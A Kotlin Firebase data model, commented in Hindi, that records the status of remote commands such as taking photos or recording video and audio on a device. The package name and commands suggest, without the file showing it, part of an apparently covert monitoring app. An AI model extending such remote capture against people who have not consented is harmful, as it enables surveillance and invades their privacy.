package com.safe.setting.app.data.model

import com.google.firebase.database.IgnoreExtraProperties

// [नया कोड]: यह पूरी क्लास नई है.
// लॉजिक: यह मॉडल फायरबेस को भेजे गए प्रत्येक रिमोट कमांड (जैसे फोटो खींचना, वीडियो रिकॉर्ड करना)
// की स्थिति को ट्रैक करने के लिए बनाया गया है. यह कमांड के प्रकार, उसकी सफलता या विफलता की स्थिति,
// और अतिरिक्त विवरण संग्रहीत करता है.
@IgnoreExtraProperties
data class CommandStatus(
    var commandType: String? = null, // जैसे, "PHOTO", "VIDEO", "AUDIO"
    var status: String? = null,       // जैसे, "SUCCESS", "FAILED", "STARTED"
    var details: String? = null,      // जैसे, "Camera permission denied by OS", "Upload successful"
    var timestamp: Long? = null
)